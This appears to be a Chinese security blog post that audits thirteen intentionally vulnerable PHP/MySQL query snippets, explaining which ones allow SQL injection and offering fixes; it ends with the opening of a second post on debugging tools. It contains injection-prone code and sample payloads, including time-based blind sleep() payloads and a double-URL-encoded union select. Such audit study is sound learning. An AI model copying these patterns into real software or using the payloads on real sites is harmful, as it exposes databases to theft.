<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$mysql_server=<span class="string">"localhost"</span>;</span><br><span class="line">$mysql_username=<span class="string">"root"</span>;</span><br><span class="line">$mysql_password=<span class="string">"root"</span>;</span><br><span class="line">$mysql_database=<span class="string">"test"</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($mysql_server,$mysql_username,$mysql_password,$mysql_database) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"数据库链接错误"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>我的mysql中表的值</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016085216387.png" alt="image-20211016085216387"></p>
</blockquote>
<h2 id="第一个SQL代码分析"><a href="#第一个SQL代码分析" class="headerlink" title="第一个SQL代码分析"></a>第一个SQL代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where name = '&#123;$name&#125;';"</span>;</span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题明显没有任何过滤，并且是最基础的sql注入漏洞直接联合查询就可以搞过</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015170030656.png" alt="image-20211015170030656"></p>
</blockquote>
<h2 id="第二个SQL代码分析"><a href="#第二个SQL代码分析" class="headerlink" title="第二个SQL代码分析"></a><strong>第二个SQL代码分析</strong></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">'name'</span>]);</span><br><span class="line">    $query = <span class="string">"SET NAMES gbk;SELECT name, age, email, country FROM user_details where name = '&#123;$name&#125;';"</span>;</span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题加了一个addslashes将单引号转义了，在单引号前面加了个\所以这题是无法注入的，宽字节注入得是上下文gbk编码什么能够宽字节编码的，所以这题也无法注入，应该说，以我技术看不出来。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015171150439.png" alt="image-20211015171150439"></p>
</blockquote>
<h2 id="第三个SQL注入代码分析"><a href="#第三个SQL注入代码分析" class="headerlink" title="第三个SQL注入代码分析"></a><strong>第三个SQL注入代码分析</strong></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = htmlspecialchars($_GET[<span class="string">'name'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where name = '&#123;$name&#125;';"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析一下<code>htmlspecialchars</code>，查文档说将特殊符号转换为html实体编码，处理xss漏洞的一个防御函数</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015172648933.png" alt="image-20211015172648933"></p>
</blockquote>
<p>开发者因为没有足够理解这个函数的关于单引号的触发机制导致漏洞，因为必须得设置ENT_QUOTES参数设置后才能转单引号，所以可以直接sql注入</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015172741090.png" alt="image-20211015172741090"></p>
</blockquote>
<h2 id="第四个SQL注入代码分析"><a href="#第四个SQL注入代码分析" class="headerlink" title="第四个SQL注入代码分析"></a>第四个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $age = addslashes($_GET[<span class="string">'age'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where age &gt; &#123;$age&#125;;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很明显的开发者因为数字比较，忽略单引号闭合，所以也不需要用单引号逃逸，所以这题也存在盲注和联合查询注入，addslashes相当于无用了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015214239719.png" alt="image-20211015214239719"></p>
</blockquote>
<h2 id="第五个SQL注入代码分析"><a href="#第五个SQL注入代码分析" class="headerlink" title="第五个SQL注入代码分析"></a>第五个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = str_replace(<span class="string">"'"</span>,<span class="string">"\\'"</span>,$_GET[<span class="string">'name'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where name = '&#123;$name&#125;';"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和addslashes差不多的意思，<code>str_replace</code>函数将子字符串的替换，将单引号替换成\加上单引号。但是和addslashes也有很大的区别，因为它会将\也变成双\，但是str_replace就只会变一次</p>
<p><strong>举例</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">addslashes会将我们传入的数据?name&#x3D;一号\‘</span><br><span class="line">转换成 &#x3D;&#x3D;&gt; 一号\\\&#39; (导致我们无法逃逸单引号)</span><br><span class="line"></span><br><span class="line">但是开发者用str_replace时，会导致我们可以sql注入</span><br><span class="line">当传入?name&#x3D;一号\&#39;</span><br><span class="line">会解析成 &#x3D;&#x3D;&gt; 一号\\&#39; (单引号前的\会被转义让我们的&#39;得以逃逸，形成sql注入)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211015220249634.png" alt="image-20211015220249634"></p>
</blockquote>
<h2 id="第六个SQL注入代码分析"><a href="#第六个SQL注入代码分析" class="headerlink" title="第六个SQL注入代码分析"></a>第六个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $id = intval($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where id = '&#123;$id&#125;';"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个也并没有发现能够注入点，intval会将其中的字符给去掉。</p>
<h2 id="第七个SQL注入代码分析"><a href="#第七个SQL注入代码分析" class="headerlink" title="第七个SQL注入代码分析"></a>第七个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intval($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $query = <span class="string">"SELECT name, age, email, country FROM user_details where id = &#123;$_GET['id']&#125;;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    </span><br><span class="line">        $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">        $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>并没有将过滤后的语句传入sql语句，所以这个intval等于无用，直接注入。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016081132609.png" alt="image-20211016081132609"></p>
</blockquote>
<h2 id="第八个SQL注入代码分析"><a href="#第八个SQL注入代码分析" class="headerlink" title="第八个SQL注入代码分析"></a>第八个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_numeric($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        header(<span class="string">"Status: 404 Not Found"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where id =  &#123;$_GET['id']&#125;;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>逻辑错误的分析，is_numeric会检测，如果是数字就可以执行，如果不是数字，就会弹404页面。但是解析器会继续向下运行，所以会导致SQL注入</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016081923564.png" alt="image-20211016081923564"></p>
</blockquote>
<h2 id="第九个SQL注入代码分析"><a href="#第九个SQL注入代码分析" class="headerlink" title="第九个SQL注入代码分析"></a>第九个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_numeric($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        header(<span class="string">"Status: 404 Not found"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where id =  &#123;$_GET['id']&#125;;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在if中加了个exit，让解析器无法继续执行，所以这个是无法注入的</p>
<h2 id="第十个SQL注入代码分析"><a href="#第十个SQL注入代码分析" class="headerlink" title="第十个SQL注入代码分析"></a>第十个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $order = addslashes($_GET[<span class="string">'order'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details ORDER BY id &#123;$order&#125;;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析：因为这里的<code>$order</code>传参是控制 查询出来的结果是升序（asc）或者降序（desc）</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016084152095.png" alt="image-20211016084152095"></p>
</blockquote>
<p><strong>这里我们可以控制order导致sql盲注，因为这里没有报错信息，所以无法报错注入，利用,添加排序字段实现注入语句使用</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">,if(1=1,sleep(1),0)</span><br><span class="line">或者是</span><br><span class="line">and(if(1=1,sleep(1),0)) <span class="comment"># 注意这里得用括号</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016084408135.png" alt="image-20211016084408135"></p>
</blockquote>
<h2 id="第十一个SQL注入代码分析"><a href="#第十一个SQL注入代码分析" class="headerlink" title="第十一个SQL注入代码分析"></a>第十一个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $order = addslashes($_GET[<span class="string">'order'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/DESC|ASC/i'</span>, $order))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Bad order"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details ORDER BY id &#123;$order&#125;;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); <span class="comment">// stmt = PDOStatement  预处理状态</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析：就是第十个代码的添加了一个过滤，必须包含asc或者desc，但是这过滤并不全，并且也没有太多限制，用，添加多一个asc就可以绕过了，如果你想让这个代码变得无法SQL注入的话</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">payload=asc,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,sleep(<span class="number">1</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">修改代码使其无法注入</span><br><span class="line">!preg_match(<span class="string">'/^(DESC|ASC)$/i'</span>, $order)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016084829538.png" alt="image-20211016084829538"></p>
</blockquote>
<h2 id="第十二个SQL注入代码分析"><a href="#第十二个SQL注入代码分析" class="headerlink" title="第十二个SQL注入代码分析"></a>第十二个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where name = ?;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); </span><br><span class="line">    $stmt-&gt;bindValue(<span class="string">"name"</span>, $name);</span><br><span class="line"></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>标准的预编译代码，我无法注入</p>
<h2 id="第十三个SQL注入代码分析"><a href="#第十三个SQL注入代码分析" class="headerlink" title="第十三个SQL注入代码分析"></a>第十三个SQL注入代码分析</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'./common.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">'name'</span>]);</span><br><span class="line">    $name  = urldecode($name);</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT name, age, email, country FROM user_details where name = '&#123;$name&#125;';"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">    $stmt = $conn-&gt;prepare($query); </span><br><span class="line"></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;bind_result($name, $age,$email,$country);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($stmt-&gt;fetch())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$email"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析：这题其实不加urldecode是无法注入的，但是urldecode可以让我们绕过addslashes，从而绕过单引号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">’ ==&gt; %<span class="number">27</span> <span class="comment">#单次url编码   因为浏览器会自动解码一次</span></span><br><span class="line">‘ ==&gt; %<span class="number">25</span>%<span class="number">32</span>%<span class="number">37</span> <span class="comment">#双次url编码</span></span><br><span class="line">payload=一号%<span class="number">25</span>%<span class="number">32</span>%<span class="number">37</span> union select <span class="number">1</span>,<span class="number">2</span>,user(),<span class="number">4</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016090452187.png" alt="image-20211016090452187"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】预备工具配置使用和学习</title>
    <url>/posts/167.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>代码审计学习记录</li>
</ul>
</blockquote>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><blockquote>
<p>PHPStrom + PHPDebug 调试配置建议看看<a href="https://www.jianshu.com/p/8fb9ad0719c2" target="_blank" rel="noopener">这篇</a></p>
</blockquote>
<p>动态调试的一些快键键</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Ctrl + F8 下断点</span><br><span class="line">F7 单步调试（进入子函数）</span><br><span class="line">F8 单步调试（不进入子函数）</span><br><span class="line">F9 执行到下一个断点</span><br><span class="line">ALT + F8 计算表达式</span><br><span class="line">Ctrl + Shift + F8 查看所有断点</span><br></pre></td></tr></table></figure></div>

<p>溯源技巧</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Ctrl + Shift + F 全项目查找</span><br><span class="line">Ctrl + 右击 查看函数调用、类定义、函数定义、包含文件所在的位置</span><br><span class="line">每一行左侧小图标 查看父类方法</span><br></pre></td></tr></table></figure></div>

<h1 id="PHP手工调试"><a href="#PHP手工调试" class="headerlink" title="PHP手工调试"></a>PHP手工调试</h1><ul>
<li>万金油函数</li>
